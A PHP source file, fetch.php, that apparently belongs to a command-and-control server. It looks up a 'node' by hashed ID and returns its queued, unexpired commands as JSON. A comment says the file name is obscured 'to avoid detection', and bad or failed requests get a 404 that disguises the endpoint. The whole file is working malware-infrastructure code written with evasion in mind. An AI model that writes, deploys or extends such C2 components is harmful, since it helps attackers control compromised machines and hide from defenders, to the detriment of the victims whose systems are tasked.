<?php
/**
 * fetch.php - Get pending commands for node
 * Obscured name to avoid detection
 */

require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    send404();
}

$validated = validateRequest();
$db = getDB();

if (!$db) {
    sendJSON(['error' => 'Service unavailable'], 503);
}

try {
    $nodeId = $validated['node_id'];
    
    // Get node ID
    $stmt = $db->prepare("SELECT id FROM nodes WHERE node_id_hash = ?");
    $stmt->execute([$nodeId]);
    $node = $stmt->fetch();
    
    if (!$node) {
        send404();
    }
    
    // Get pending commands
    $cmdStmt = $db->prepare("
        SELECT id, command, created_at
        FROM commands
        WHERE node_id = ? AND status = 'pending'
        AND (expires_at IS NULL OR expires_at > NOW())
        ORDER BY created_at ASC
    ");
    $cmdStmt->execute([$node['id']]);
    $commands = $cmdStmt->fetchAll();
    
    sendJSON([
        'status' => 'ok',
        'commands' => $commands
    ]);
    
} catch (PDOException $e) {
    error_log("Fetch error: " . $e->getMessage());
    send404();
}

?>

